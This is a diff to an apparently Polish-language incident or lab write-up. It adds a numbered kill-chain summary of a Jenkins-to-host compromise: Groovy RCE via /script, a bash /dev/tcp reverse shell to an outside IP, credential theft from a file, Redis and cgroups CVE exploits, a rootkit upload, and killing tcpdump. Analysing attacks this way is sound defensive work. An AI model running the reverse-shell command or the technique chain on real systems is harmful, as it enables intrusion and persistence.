@@ -267,6 +267,36 @@ To jest ciekawa część. Po ruchomieniu uploadserwera , atakujący grepuje w ps
 ```
 
 ## tl;dr
-- Initial Access & Reconnaissance
+1. Initial Access & Reconnaissance
   - wykrycie publicznie dostepnego serwera Jenkins (v2.387.1)
-  - dostepny endpoint */script*
+  - dostepny endpoint */script* (Groovy RCE)
+
+2. Execution
+  - zestawienie reverse shell *bash -i >& /dev/tcp/185.220.101.50/4444 0>&1*
+
+3. Discovery/Enumeration
+  - pobranie i wykorzystanie narzędzia LinPEAS
+  - enumerowanie narzędziem usług, userów, procesów, poświadczeń etc.
+
+4. Credential Access 
+  - odczyt pliku */var/jenkins_home/credentials.txt* i pozyskanie *redis_user:R3d1s_Us3r_P@ss!*
+
+5. Lateral Movement
+  - połaczenie telnetem do kolejnego systemu oraz usykanie dostepu do kontenera Redis (v5.0.7)
+
+6. Privilege Escalation
+  - wykorzystanie *CVE-2025-49844* poprzez ulopad i wykonanie expolita *exploit.lua*
+
+7. Container Escape
+  - wykorzystanie *CVE-2022-0492 (cgroups)* poprzez ulopad i wykonanie expolita *escape.sh*
+
+8. Command & Control (C2)
+  - udana ucieczka z kontenera na hosta i zestawienie nowego reverse shella (185.220.101.50:5555)
+
+9. Persistence & Impact
+  - przygotowanie środowiska python, przygotwanie *uploadserver* 
+  - upload plików *kernel-rootkit.c*, *Makefile*, *install-rootkit.sh*
+
+10. Defense Evasion
+  - wykrycie procesu *tcpdump*
+  - zakończenie procesu *kill -9 24918*
